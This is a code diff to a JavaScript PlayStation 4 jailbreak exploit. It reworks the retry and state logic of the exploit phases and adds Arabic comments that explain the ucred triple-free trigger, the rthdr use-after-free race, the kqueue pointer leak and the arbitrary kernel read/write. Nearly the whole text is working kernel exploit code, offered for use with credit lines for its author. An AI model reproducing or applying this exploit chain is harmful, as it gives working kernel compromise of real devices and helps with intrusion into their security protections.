@@ -1016,23 +1016,30 @@ function yield_to_render(callback) {
   }, 0);
 }
 var exploit_count = 0;
-var exploit_end = false;
+var exploit_end   = false;
+
 function netctrl_exploit() {
   setup_log_screen();
+
   var supported_fw = init();
   if (!supported_fw) {
     return;
   }
+
+  exploit_end   = false;
+  exploit_count = 0;
+
   log('Setting up exploit...');
   yield_to_render(exploit_phase_setup);
 }
+
 function exploit_phase_setup() {
   if (exploit_end) return;
 
   var ok = setup();
   if (!ok) {
     log('Setup failed, aborting exploit.');
-    exploit_end = false;
+    exploit_end = true;      // فشل نهائي فعلاً
     return;
   }
 
@@ -1040,12 +1047,13 @@ function exploit_phase_setup() {
   exploit_count = 0;
   yield_to_render(exploit_phase_trigger);
 }
+
 function exploit_phase_trigger() {
   if (exploit_end) return;
 
   if (exploit_count >= MAIN_LOOP_ITERATIONS) {
     log('Failed to acquire kernel R/W');
-    exploit_end = false;
+    exploit_end = true;      // استنفدنا كل المحاولات
     return;
   }
 
@@ -1053,10 +1061,12 @@ function exploit_phase_trigger() {
   log('Triggering Retrying... (' + exploit_count + '/' + MAIN_LOOP_ITERATIONS + ')...');
 
   if (!trigger_ucred_triplefree()) {
+    // التريجر فشل المرة دي بس، مش فشل نهائي
     yield_to_render(exploit_phase_trigger);
     return;
   }
 
+  // التريجر نجح → نروح للـ leak
   log('Leaking Exploit...');
   yield_to_render(exploit_phase_leak);
 }
@@ -1065,11 +1075,13 @@ function exploit_phase_leak() {
   if (exploit_end) return;
 
   if (!leak_kqueue_safe()) {
+    // leak فشل المرة دي بس، نرجع نعيد التريجر
     log('Leak failed — retrying...');
     yield_to_render(exploit_phase_trigger);
     return;
   }
 
+  // leak نجح → نروح للـ RW
   log('Exploit Read/Write...');
   log('Stability by M.ELHOUT');
   yield_to_render(exploit_phase_rw);
@@ -1086,20 +1098,27 @@ function exploit_phase_rw() {
   }
 
   if (!ok) {
+    // هنا فعلاً مافيش رجوع منطقي
     utils.notify('Jailbreak failed — please reboot your PS4.');
-    exploit_end = false;
+    exploit_end = true;
     return;
   }
+
   log(' Stability by M.ELHOUT...');
   utils.notify('Jailbreak Success');
   utils.notify('Stability by M.ELHOUT');
   utils.notify('< Sob7an allh W b Hamdh >');
   utils.notify('< Sob7an allh alazeem >');
+
+  yield_to_render(exploit_phase_jailbreak);
 }
+
 function exploit_phase_jailbreak() {
+  if (exploit_end) return;
+
   jailbreak();
   cleanup();
-  exploit_end = true;
+  exploit_end = true;   // هنا بس نقفل الباب فعلاً
 }
 function safe_fhold_fd(fd, label) {
   if (fd < 0) {
@@ -1182,23 +1201,23 @@ function setup_arbitrary_rw() {
   safe_fhold_fd(victim_pipe[0], 'victim_pipe[0]');
   safe_fhold_fd(victim_pipe[1], 'victim_pipe[1]');
 
-  // 9) تنظيف rthdr (best-effort)
+  // 9) تنظيف rthdr (best-effort – لا يوقع الإكسبلويت)
   try {
     remove_rthr_from_socket(ipv6_socks[triplets[0]]);
   } catch (e) {
-    log("remove_rthr_from_socket triplet[0] failed (ignored)");
+    log('remove_rthr_from_socket triplet[0] failed (ignored)');
   }
 
   try {
     remove_rthr_from_socket(ipv6_socks[triplets[1]]);
   } catch (e) {
-    log("remove_rthr_from_socket triplet[1] failed (ignored)");
+    log('remove_rthr_from_socket triplet[1] failed (ignored)');
   }
 
   try {
     remove_rthr_from_socket(ipv6_socks[triplets[2]]);
   } catch (e) {
-    log("remove_rthr_from_socket triplet[2] failed (ignored)");
+    log('remove_rthr_from_socket triplet[2] failed (ignored)');
   }
 
   // 10) إزالة الملف الثلاثي freed
@@ -1643,51 +1662,57 @@ function trigger_ucred_triplefree() {
   return true;
 }
 function leak_kqueue() {
-  var kq         = new BigInt(0);
-  var magic_val  = new BigInt(0x0, 0x1430000);
-  var magic_add  = leak_rthdr.add(0x08);
+  var kq        = new BigInt(0);
+  var magic_val = new BigInt(0x0, 0x1430000);
+  var magic_add = leak_rthdr.add(0x08);
 
-  var count      = 0;
-  var MAX_KQ     = 10000;     // أقل من 2000 لأن النجاح بقى أعلى
-  var INNER_MAX  = 100;      // أعلى من 500 لزيادة فرصة الـ window
+  var count     = 0;
+  var MAX_KQ    = 15000;   // عدد محاولات kqueue
+  var INNER_MAX = 100;     // عدد محاولات window لكل kqueue
 
-  var success    = false;
+  var success   = false;
 
   while (count < MAX_KQ) {
     count++;
 
+    // 1) إنشاء kqueue جديد
     kq = kqueue();
     if (kq.eq(BigInt_Error)) {
       return false;
     }
 
-    // تصفير
+    // 2) تصفير buffer قبل بداية دورة الـ inner
     write64(magic_add, 0);
     write64(leak_rthdr.add(0x98), 0);
 
-    // تحرير triplet لإعادة الاستخدام
+    // 3) تحرير rthdr لفتح نافذة الـ reuse
     free_rthdr(ipv6_socks[triplets[1]]);
 
     var inner_tries = 0;
 
     while (inner_tries < INNER_MAX) {
 
-      // دبق خفيف
-      for (var d = 0; d < 10; d++) {
-        // noop
-      }
+      // 4) دبق خفيف لزيادة فرصة الـ race بدون تجميد
+      for (var d = 0; d < 15; d++) {}
 
+      // 5) قراءة rthdr بعد الـ free (هنا يحصل الـ reuse لو محظوظين)
       get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x100);
 
+      // 6) قراءة magic + fdp من الـ buffer اللي kernel لسه كتبه
       var magic = read64(magic_add);
       var fdp   = read64(leak_rthdr.add(0x98));
 
+      // 7) شرط نجاح الـ leak
       if (magic.eq(magic_val) && !fdp.eq(0)) {
         success = true;
         break;
       }
 
-      // منع الكراش
+      // 8) تصفير بعد المحاولة الفاشلة (متناغم مع آخر mbuf مكتوب)
+      write64(magic_add, 0);
+      write64(leak_rthdr.add(0x98), 0);
+
+      // 9) منع الفريز: yield كل 20 محاولة
       if ((inner_tries % 20) === 0) {
         sched_yield();
       }
@@ -1695,6 +1720,7 @@ function leak_kqueue() {
       inner_tries++;
     }
 
+    // 10) لو نجحنا في أي inner loop
     if (success) {
       kl_lock = read64(leak_rthdr.add(0x60));
       kq_fdp  = read64(leak_rthdr.add(0x98));
@@ -1706,17 +1732,21 @@ function leak_kqueue() {
 
       close(kq);
 
+      // إعادة ضبط triplet بعد ما استغلينا الـ leak
       triplets[1] = find_triplet(triplets[0], triplets[2]);
 
       return true;
     }
 
+    // 11) فشل في هذه الدورة → نقفل kqueue ونسيب فرصة للنظام
     close(kq);
     sched_yield();
   }
 
+  // 12) استنفدنا كل المحاولات من غير نجاح
   return false;
 }
+
 function leak_kqueue_safe() {
   try {
     return leak_kqueue();
